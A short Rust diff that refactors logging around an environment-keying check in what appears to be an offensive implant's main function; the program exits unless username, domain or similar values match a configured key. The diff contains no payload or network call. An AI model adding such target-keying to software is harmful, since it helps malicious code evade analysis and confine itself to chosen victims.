@@ -108,12 +108,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     // Before anything else happens, we key to the env if the config has been set.
-    let keyed_result: bool = env_key::check_env_keys(&mut config_options).await;
     // match the keyed results. This is boiled down to a bool to account for any type of keying (by username, domain, etc)
-    if let true = keyed_result {
-        println!("[+] Key matches, continuing...")
+    if env_key::check_env_keys(&mut config_options).await {
+        logger.info(log_out!("Key matches, continuing..."))
     } else {
-        println!("[-] No key match. Shutting down...");
+        logger.crit(log_out!("No key match. Shutting down..."));
         exit(1)
     }
 
